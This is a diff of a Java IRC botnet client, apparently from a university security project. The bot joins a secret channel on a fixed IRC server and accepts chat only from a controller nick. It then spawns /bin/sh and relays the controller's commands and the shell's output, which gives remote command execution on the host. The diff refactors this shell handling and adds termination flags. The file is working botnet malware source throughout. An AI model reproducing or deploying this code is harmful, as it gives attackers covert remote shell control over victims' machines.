@@ -5,6 +5,8 @@ import java.util.*;
 import org.jibble.pircbot.*;
 
 public class BotnetClient extends PircBot {
+	private static final String SENTINEL = "$: ";
+	private static final String TERMINATION = "exit";
 	private static final boolean DEBUG = true;
 	private static final String SERVER = "eve.cs.washington.edu";
 	private static final String CHANNEL = "#hacktastic";
@@ -13,9 +15,7 @@ public class BotnetClient extends PircBot {
 	private static final int PORT = 6667;
 	private String uuid;
 	private String id;
-	private Scanner input;
 	private String operator;
-	private ChatThread chat;
 	
 	public static void main(String[] args) {
 		BotnetClient bn = new BotnetClient();
@@ -25,7 +25,6 @@ public class BotnetClient extends PircBot {
 		//MsgEncrypt cipher = MsgEncrypt.getInstance(key, secretKey);
 		uuid = UUID.randomUUID().toString();
 		id = NAME + "_" + uuid;
-		input = new Scanner(System.in);
 		try {
 			setVerbose(DEBUG);
 			setName(id);
@@ -33,7 +32,6 @@ public class BotnetClient extends PircBot {
 			connect(SERVER, PORT);
 			joinChannel(CHANNEL);
 			setMode(CHANNEL, "+s");
-			input = new Scanner(System.in);
 		} catch (NickAlreadyInUseException e) {
 			uuid = UUID.randomUUID().toString();
 			id = NAME + "_" + uuid;
@@ -73,68 +71,51 @@ public class BotnetClient extends PircBot {
 	}
 	
 
-	protected void onIncomingChatRequest(DccChat chatObj) {
-		if (chatObj == null) {
+	protected void onIncomingChatRequest(DccChat chat) {
+		if (chat == null) {
 			System.out.println("Chat failed, passed null.");
 		} else {
-			chat = new ChatThread(chatObj);
-			chat.start();
-		}
-	}
-	
-	private class ChatThread extends Thread {
-		private static final String SENTINEL = "$: ";
-		DccChat chat;
-		
-		public ChatThread(DccChat chat) {
-			this.chat = chat;
 			try {
-				if (chat.getNick().equalsIgnoreCase(CC)) {
-					chat.accept();
-				} else {
+				if (!chat.getNick().equalsIgnoreCase(CC)) {
 					System.out.println(chat.getNick() + "<" + chat.getHostname() + " | " + chat.getNumericalAddress() + "> tried to use me" );
+				} else {
+					chat.accept();
+					
+					//Create the bash shell
+					Runtime r = Runtime.getRuntime();
+					Process p = r.exec("/bin/sh");
+
+					//Gather the input/output stream to the bash shell process
+					PrintWriter bashin = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())), true);
+					BufferedReader bashout = new BufferedReader(new InputStreamReader(p.getInputStream()));
+					BufferedReader basherror = new BufferedReader(new InputStreamReader(p.getErrorStream()));
+					
+					//Send input commands to the process in a separate thread
+					ProcessInputThread inputThread = new ProcessInputThread(chat, bashin);	   
+					inputThread.start();
+					
+					ProcessErrorThread errorThread = new ProcessErrorThread(chat, basherror);
+					errorThread.start();
+					
+		        	//print the results only
+	        		while (inputThread.isAlive()) {
+	        			String s = bashout.readLine();
+	        			while (s != null && !s.equals(SENTINEL)) {
+	        				chat.sendLine(s);
+	        				System.out.println("bash response: " + s);
+	        				s = bashout.readLine();
+	        			}
+	        			chat.sendLine(s);
+	        		}
+		        	chat.close();
+		        	inputThread.kill();
+		        	errorThread.kill();
+		        	p.destroy();
+				    System.out.println("Closed the bash shell");
 				}
 			} catch(Exception e) {
 				System.out.println(e.getMessage());
 			}
-		}
-		
-		public void run() {
-			Runtime r = Runtime.getRuntime();
-			try {
-				//Create the bash shell
-				Process p = r.exec("/bin/sh");
-
-				//Gather the input/output stream to the bash shell process
-				PrintWriter bashin = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())), true);
-				BufferedReader bashout = new BufferedReader(new InputStreamReader(p.getInputStream()));
-				BufferedReader basherror = new BufferedReader(new InputStreamReader(p.getErrorStream()));
-				
-				//Send input commands to the process in a separate thread
-				ProcessInputThread inputThread = new ProcessInputThread(chat, bashin);	   
-				inputThread.start();
-				
-				ProcessErrorThread errorThread = new ProcessErrorThread(chat, basherror);
-				errorThread.start();
-				
-	        	//print the results only
-        		while (inputThread.isAlive()) {
-        			String s = bashout.readLine();
-        			while (s != null && !s.equals(SENTINEL)) {
-        				chat.sendLine(s);
-        				System.out.println("bash response: " + s);
-        				s = bashout.readLine();
-        			}
-        			chat.sendLine(s);
-        		}
-        		bashout.close();
-        		basherror.close();
-        		bashin.close();
-	        	chat.close();
-		     } catch (Exception e) {
-		    	 e.printStackTrace();
-		     }
-		     System.out.println("Closed the bash shell");
 		}
 	}
 	
@@ -143,17 +124,23 @@ public class BotnetClient extends PircBot {
 		private static final String TERMINATION = "exit";
 	    private DccChat chat;
 	    private PrintWriter bashin;
+	    private boolean terminate;
 	    
 	    public ProcessInputThread(DccChat chat, PrintWriter writer) {
 	        this.chat = chat;
 	        bashin = writer;
+	        terminate = false;
+	    }
+	    
+	    public void kill() {
+	    	terminate = true;
 	    }
 
 	    public void run() {
 	    	try {
-	    		bashin.println("echo '$: '");
+	    		bashin.println("echo `pwd` '$: '");
 		    	String command = chat.readLine();
-	        	while (command != null && !command.equalsIgnoreCase(TERMINATION)) {
+	        	while (command != null && !command.equalsIgnoreCase(TERMINATION) && !terminate) {
 	        		System.out.println("command: " + command);
 	        		bashin.println(command);
 	        		bashin.println("echo `pwd` '$: '");
@@ -166,20 +153,27 @@ public class BotnetClient extends PircBot {
 	    	System.out.println("Done feeding output from the bash shell to the master bot");
 	    }
 	}
-	//This class passes input from the chat object (the master bot) to the bash shell
+	
+	//This class passes error output from the bash shell to the chat object (the master bot)
 	public class ProcessErrorThread extends Thread {
 	    private DccChat chat;
 	    private BufferedReader bashin;
+	    private boolean terminate;
 	    
 	    public ProcessErrorThread(DccChat chat, BufferedReader writer) {
 	        this.chat = chat;
 	        bashin = writer;
+	        terminate = false;
+	    }
+	    
+	    public void kill() {
+	    	terminate = true;
 	    }
 
 	    public void run() {
 	    	try {
 	    		String s = "";
-	        	while (s != null && bashin.ready()) {
+	        	while (s != null && bashin.ready() && !terminate) {
 	        		s = bashin.readLine();
 	        		System.out.println("error: " + s);
 	        		chat.sendLine(s);
